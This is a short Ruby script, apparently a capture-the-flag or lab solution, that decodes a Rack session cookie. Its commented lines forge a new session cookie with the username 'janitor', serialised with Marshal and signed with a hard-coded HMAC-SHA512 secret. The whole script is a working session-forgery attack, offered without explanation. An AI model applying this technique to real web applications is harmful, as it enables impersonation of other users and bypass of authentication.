require "base64"
require "pp"
require "cgi"
require "openssl"

c = "Z1ECHPEV6BwABOkAMmGC+OqkHydszcGs1+zB5ngIIW5pOYWrDACzG/FMAjBwO+JfqnunTmZhqrHNj9NPeA9nwkTJE7R18vn/4sgE2w+aunDqyco1tJYaAsX7Z1xTOpcTLKQgl+TjS8BWcQ5OdTbBL+Q854ofGKge3SuuVlFD8RGVp8LI9dgYAxzEhuFpdbQ4s+E3kjgvHZ9FqbQngr2w+aD8hjhIT2Yku/RKu0F9Ie4sHhPx402zy9Bwop5XZaytvArLT6tcKf6BSFvsEKiurlTPf+l/nJ+Ljnp0TePvdIcIpp2ERWH0BbjpaE4CbNHw59gxiW+tlJFCQnOCzf4pxbZgHt9tjkwgKlJXmm7sFFAksX04LtZLZyiL+X8VNRbgKfUJCnwnebEInBYgkQ==--xl/oIcGu5bS47k8m--JK2spTSDeC0nPr8ZudRzng=="
cookie, signature = c.split("--")
decoded = Base64.decode64(CGI.unescape(cookie))
pp decoded

# rackSession = '{"tracking"=>{"HTTP_USER_AGENT"=>"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/113.0.0.0 safari/537.36"}, "session_id"=>"f59d787e5bf4144ab3c32221f1aecb47314cd264560c8177561fb1d788d6cfef", "csrf"=>"g_8eCmShxMZ4vcZpBBmad6u2-S7KGsBkWXWYlDjJD6A=", "username"=>"janitor"}'
# nc = Base64.encode64(Marshal.dump(rackSession))
# ns = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA512.new, "a9316e61bc75029d52f915823d7bb628a4adae8b174bce89fd38ec4c7fb925a07e2ccbc01572b9fdce56502ef5d02609e5194a5ddd649ff349a206002e96a99d", nc)
# newcookie = CGI.escape(nc).gsub("=","%3D")+"--"+ns
# pp newcookie
